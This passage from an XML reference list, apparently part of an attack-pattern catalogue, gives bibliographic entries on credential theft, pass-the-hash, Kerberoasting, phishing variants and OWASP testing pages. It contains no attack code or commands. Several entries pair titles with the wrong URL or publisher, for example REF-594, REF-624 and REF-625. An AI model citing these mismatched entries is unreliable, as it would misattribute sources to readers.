         <ns0:Publisher>Cybersecurity and Infrastructure Security Agency (CISA)</ns0:Publisher>
         <ns0:URL>https://www.us-cert.gov/ncas/current-activity/2019/08/08/acsc-releases-advisory-password-spraying-attacks</ns0:URL>
         <ns0:URL_Date>2020-04-30</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-566">
         <ns0:Author>Andy Greenberg</ns0:Author>
         <ns0:Title>A notorious Iranian hacking crew is targeting industrial control systems</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--11</ns0:Publication_Month>
         <ns0:Publication_Day>---23</ns0:Publication_Day>
         <ns0:Publisher>Ars Technica</ns0:Publisher>
         <ns0:URL>https://arstechnica.com/information-technology/2019/11/a-notorious-iranian-hacking-crew-is-targeting-industrial-control-systems/</ns0:URL>
         <ns0:URL_Date>2020-04-30</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-567">
         <ns0:Title>Alert (TA18-086A): Brute Force Attacks Conducted by Cyber Actors</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publication_Day>---27</ns0:Publication_Day>
         <ns0:Publisher>Cybersecurity and Infrastructure Security Agency (CISA)</ns0:Publisher>
         <ns0:URL>https://www.us-cert.gov/ncas/alerts/TA18-086A</ns0:URL>
         <ns0:URL_Date>2020-05-01</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-568">
         <ns0:Title>Credential stuffing</ns0:Title>
         <ns0:Publisher>Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-community/attacks/Credential_stuffing</ns0:URL>
         <ns0:URL_Date>2020-05-01</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-569">
         <ns0:Author>Jessica Silver-Greenberg</ns0:Author>
         <ns0:Author>Matthew Goldstein</ns0:Author>
         <ns0:Author>Nicole Perlroth</ns0:Author>
         <ns0:Title>JPMorgan Chase Hacking Affects 76 Million Households</ns0:Title>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:Publication_Day>---02</ns0:Publication_Day>
         <ns0:Publisher>The New York Times</ns0:Publisher>
         <ns0:URL>https://dealbook.nytimes.com/2014/10/02/jpmorgan-discovers-further-cyber-security-issues/</ns0:URL>
         <ns0:URL_Date>2020-05-01</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-570">
         <ns0:Title>Attractive Accounts for Credential Theft</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---31</ns0:Publication_Day>
         <ns0:Publisher>Microsoft Corporation</ns0:Publisher>
         <ns0:URL>https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/attractive-accounts-for-credential-theft?redirectedfrom=MSDN</ns0:URL>
         <ns0:URL_Date>2020-05-05</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-571">
         <ns0:Author>Feike Hacquebord</ns0:Author>
         <ns0:Title>Two Years of Pawn Storm: Examining an Increasingly Relevant Threat</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publication_Day>---25</ns0:Publication_Day>
         <ns0:Publisher>Trend Micro</ns0:Publisher>
         <ns0:URL>https://documents.trendmicro.com/assets/wp/wp-two-years-of-pawn-storm.pdf</ns0:URL>
         <ns0:URL_Date>2020-05-05</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-572">
         <ns0:Title>Corporate IoT &#8211; a path to intrusion</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:Publication_Day>---05</ns0:Publication_Day>
         <ns0:Publisher>Microsoft Security Response Center (MSRC)</ns0:Publisher>
         <ns0:URL>https://msrc-blog.microsoft.com/2019/08/05/corporate-iot-a-path-to-intrusion</ns0:URL>
         <ns0:URL_Date>2020-05-05</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-573">
         <ns0:Author>Brendan McKeague</ns0:Author>
         <ns0:Author>Van Ta</ns0:Author>
         <ns0:Author>Ben Fedore</ns0:Author>
         <ns0:Author>Geoff Ackerman</ns0:Author>
         <ns0:Author>Alex Pennino</ns0:Author>
         <ns0:Author>Andrew Thompson</ns0:Author>
         <ns0:Author>Douglas Bienstock</ns0:Author>
         <ns0:Title>Pick-Six: Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publication_Day>---05</ns0:Publication_Day>
         <ns0:Publisher>Microsoft Security Response Center (MSRC)</ns0:Publisher>
         <ns0:URL>https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html</ns0:URL>
         <ns0:URL_Date>2020-05-05</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-574">
         <ns0:Title>Risks of Default Passwords on the Internet</ns0:Title>
         <ns0:Publication_Year>2016</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:Publication_Day>---07</ns0:Publication_Day>
         <ns0:Publisher>Cybersecurity and Infrastructure Security Agency (CISA)</ns0:Publisher>
         <ns0:URL>https://www.us-cert.gov/ncas/alerts/TA13-175A</ns0:URL>
         <ns0:URL_Date>2020-05-05</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-575">
         <ns0:Author>Dan Goodin</ns0:Author>
         <ns0:Title>Attackers can use Zoom to steal users&#8217; Windows credentials with no warning</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publication_Day>---01</ns0:Publication_Day>
         <ns0:Publisher>Ars Technica</ns0:Publisher>
         <ns0:URL>https://arstechnica.com/information-technology/2020/04/unpatched-zoom-bug-lets-attackers-steal-windows-credentials-with-no-warning/</ns0:URL>
         <ns0:URL_Date>2020-05-07</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-576">
         <ns0:Author>Jeff Warren</ns0:Author>
         <ns0:Title>How Attackers are Stealing Your Credentials with Mimikatz</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publication_Day>---11</ns0:Publication_Day>
         <ns0:Publisher>STEALTHbits Technologies, Inc.</ns0:Publisher>
         <ns0:URL>https://blog.stealthbits.com/how-attackers-are-stealing-your-credentials-with-mimikatz/</ns0:URL>
         <ns0:URL_Date>2020-05-07</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-577">
         <ns0:Title>Overview of problems that may occur when administrative shares are missing</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publication_Day>---13</ns0:Publication_Day>
         <ns0:Publisher>Microsoft Corporation</ns0:Publisher>
         <ns0:URL>https://support.microsoft.com/en-us/help/842715/overview-of-problems-that-may-occur-when-administrative-shares-are-mis</ns0:URL>
         <ns0:URL_Date>2020-05-07</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-578">
         <ns0:Author>Rob Smallridge</ns0:Author>
         <ns0:Title>HAPT15 is alive and strong: An analysis of RoyalCli and RoyalDNS</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publication_Day>---10</ns0:Publication_Day>
         <ns0:Publisher>NCC Group</ns0:Publisher>
         <ns0:URL>https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/</ns0:URL>
         <ns0:URL_Date>2020-05-07</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-579">
         <ns0:Author>Assaf Dahan</ns0:Author>
         <ns0:Title>Operation Cobalt Kitty: Cybereason Labs Analysis</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publisher>CyberReason</ns0:Publisher>
         <ns0:URL>https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf</ns0:URL>
         <ns0:URL_Date>2020-05-07</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-580">
         <ns0:Author>Mor Levi</ns0:Author>
         <ns0:Author>Assaf Dahan</ns0:Author>
         <ns0:Author>Amit Serper</ns0:Author>
         <ns0:Title>Operation Soft Cell: A Worldwide Campaign Against Telecommunications Providers</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---25</ns0:Publication_Day>
         <ns0:Publisher>CyberReason</ns0:Publisher>
         <ns0:URL>https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers</ns0:URL>
         <ns0:URL_Date>2020-05-07</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-581">
         <ns0:Title>Mitigating Pass-the-Hash and Other Credential Theft v2</ns0:Title>
         <ns0:Publisher>Microsoft Corporation</ns0:Publisher>
         <ns0:URL>https://docs.microsoft.com/en-us/previous-versions/dn785092(v=msdn.10)?redirectedfrom=MSDN</ns0:URL>
         <ns0:URL_Date>2020-05-07</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-582">
         <ns0:Title>How Pass-the-Hash works</ns0:Title>
         <ns0:Publisher>Microsoft Corporation</ns0:Publisher>
         <ns0:URL>https://docs.microsoft.com/en-us/previous-versions/dn785092(v=msdn.10)?redirectedfrom=MSDN</ns0:URL>
         <ns0:URL_Date>2020-05-07</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-583">
         <ns0:Author>Bashar Ewaida</ns0:Author>
         <ns0:Title>Pass-the-hash attacks: Tools and Mitigation</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---23</ns0:Publication_Day>
         <ns0:Publisher>The SANS Institute</ns0:Publisher>
         <ns0:URL>https://www.sans.org/reading-room/whitepapers/testing/paper/33283</ns0:URL>
         <ns0:URL_Date>2020-05-07</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-584">
         <ns0:Title>BRONZE BUTLER Targets Japanese Enterprises</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:Publication_Day>---12</ns0:Publication_Day>
         <ns0:Publisher>Secureworks&#174; Counter Threat Unit&#8482; Threat Intelligence</ns0:Publisher>
         <ns0:URL>https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses</ns0:URL>
         <ns0:URL_Date>2020-05-15</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-585">
         <ns0:Title>Kerberoasting Without Mimikatz</ns0:Title>
         <ns0:Publication_Year>2016</ns0:Publication_Year>
         <ns0:Publication_Month>--11</ns0:Publication_Month>
         <ns0:Publication_Day>---01</ns0:Publication_Day>
         <ns0:URL>https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</ns0:URL>
         <ns0:URL_Date>2020-05-15</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-586">
         <ns0:Title>Invoke-Kerberoast</ns0:Title>
         <ns0:URL>https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/</ns0:URL>
         <ns0:URL_Date>2020-05-15</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-587">
         <ns0:Author>Alexander Sotirov</ns0:Author>
         <ns0:Author>Marc Stevens</ns0:Author>
         <ns0:Author>Jacob Appelbaum</ns0:Author>
         <ns0:Author>Arjen Lenstra</ns0:Author>
         <ns0:Author>David Molnar</ns0:Author>
         <ns0:Author>Dag Arne Osvik</ns0:Author>
         <ns0:Author>Benne de Weger</ns0:Author>
         <ns0:Title>MD5 considered harmful today</ns0:Title>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:URL>https://www.win.tue.nl/hashclash/rogue-ca/#Ref</ns0:URL>
         <ns0:URL_Date>2020-06-04</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-588">
         <ns0:Author>Swarup Bhunia</ns0:Author>
         <ns0:Author>Mark M. Tehranipoor</ns0:Author>
         <ns0:Title>The Hardware Trojan War: Attacks, Myths, and Defenses</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--11</ns0:Publication_Month>
         <ns0:Publication_Day>---30</ns0:Publication_Day>
         <ns0:Publisher>Springer</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-589">
         <ns0:Author>Boyang Du</ns0:Author>
         <ns0:Author>Matteo Sonza Reorda</ns0:Author>
         <ns0:Author>Luca Sterpone</ns0:Author>
         <ns0:Author>Luis Parra</ns0:Author>
         <ns0:Author>Marta Portela-Garcia</ns0:Author>
         <ns0:Author>Almudena Lindoso</ns0:Author>
         <ns0:Author>Luis Entrena</ns0:Author>
         <ns0:Title>Exploiting the debug interface to support on-line test of control flow errors</ns0:Title>
         <ns0:Publication_Year>2013</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publication_Day>---08</ns0:Publication_Day>
         <ns0:Publisher>Institute of Electrical and Electronics Engineers (IEEE)</ns0:Publisher>
         <ns0:URL>https://ieeexplore.ieee.org/document/6604058/authors#authors</ns0:URL>
         <ns0:URL_Date>2020-07-13</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-590">
         <ns0:Title>What is smishing?</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---18</ns0:Publication_Day>
         <ns0:Publisher>NortonLifeLock Inc.</ns0:Publisher>
         <ns0:URL>https://us.norton.com/internetsecurity-emerging-threats-what-is-smishing.html</ns0:URL>
         <ns0:URL_Date>2020-11-13</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-591">
         <ns0:Title>What is Smishing and How to Defend Against it?</ns0:Title>
         <ns0:Publisher>AO Kaspersky Lab</ns0:Publisher>
         <ns0:URL>https://usa.kaspersky.com/resource-center/threats/what-is-smishing-and-how-to-defend-against-it</ns0:URL>
         <ns0:URL_Date>2020-11-13</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-592">
         <ns0:Author>Jovi Umawing</ns0:Author>
         <ns0:Title>Something else is phishy: How to detect phishing attempts on mobile phones</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publication_Day>---10</ns0:Publication_Day>
         <ns0:Publisher>Malwarebytes</ns0:Publisher>
         <ns0:URL>https://blog.malwarebytes.com/101/2018/12/something-else-phishy-detect-phishing-attempts-mobile/</ns0:URL>
         <ns0:URL_Date>2020-11-13</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-593">
         <ns0:Author>Aaron Cockerill</ns0:Author>
         <ns0:Title>5 most common mobile phishing tactics</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publication_Day>---17</ns0:Publication_Day>
         <ns0:Publisher>AT&amp;T Cybersecurity</ns0:Publisher>
         <ns0:URL>https://cybersecurity.att.com/blogs/security-essentials/mobile-phishing</ns0:URL>
         <ns0:URL_Date>2020-11-13</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-594">
         <ns0:Author>Jennifer van der Kleut</ns0:Author>
         <ns0:Title>What is vishing? Tips for spotting and avoiding voice scams</ns0:Title>
         <ns0:Publisher>NortonLifeLock Inc.</ns0:Publisher>
         <ns0:URL>https://ieeexplore.ieee.org/document/6604058/authors#authors</ns0:URL>
         <ns0:URL_Date>2020-11-13</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-595">
         <ns0:Title>What Is Vishing?</ns0:Title>
         <ns0:Publisher>AO Kaspersky Lab</ns0:Publisher>
         <ns0:URL>https://www.kaspersky.com/resource-center/definitions/vishing</ns0:URL>
         <ns0:URL_Date>2020-11-13</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-596">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-597">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-598">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-599">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-600">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-601">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-602">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-603">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-604">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-605">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-606">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-607">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-608">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-609">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-610">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-611">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-612">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-613">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-614">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-615">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-616">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-617">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-618">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-619">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-620">
         <ns0:Title>OWASP Vulnerabilities</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-community/vulnerabilities/Buffer_Overflow</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-621">
         <ns0:Title>OWASP Vulnerabilities</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-622">
         <ns0:Title>MITRE ATT&amp;CK</ns0:Title>
         <ns0:URL>https://attack.mitre.org/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-623">
         <ns0:Title>Attacks on Software Application Security</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-community/attacks/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-624">
         <ns0:Author>Ansgar Kellner</ns0:Author>
         <ns0:Author>Micha Horlboge</ns0:Author>
         <ns0:Author>Konrad Rieck</ns0:Author>
         <ns0:Author>Christian Wressnegger</ns0:Author>
         <ns0:Title>False Sense of Security: A Study on the Effectivity of Jailbreak Detection in Banking Apps</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---17</ns0:Publication_Day>
         <ns0:Publisher>Technische Universit&#228;t Braunschweig</ns0:Publisher>
         <ns0:URL>https://cybersecurity.att.com/blogs/security-essentials/mobile-phishing</ns0:URL>
         <ns0:URL_Date>2020-12-15</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-625">
         <ns0:Author>San-Tsai Sun</ns0:Author>
         <ns0:Author>Andrea Cuadros</ns0:Author>
         <ns0:Author>Konstantin Beznosov</ns0:Author>
         <ns0:Title>Android Rooting: Methods, Detection, and Evasion</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---17</ns0:Publication_Day>
         <ns0:Publisher>Technische Universit&#228;t Braunschweig</ns0:Publisher>
         <ns0:URL>http://lersse-dl.ece.ubc.ca/record/310/files/p3.pdf?subformat=pdfa</ns0:URL>
         <ns0:URL_Date>2020-12-15</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-626">
         <ns0:Author>Jose Lopes</ns0:Author>
         <ns0:Title>Who owns your runtime?</ns0:Title>
         <ns0:Publication_Year>2015</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
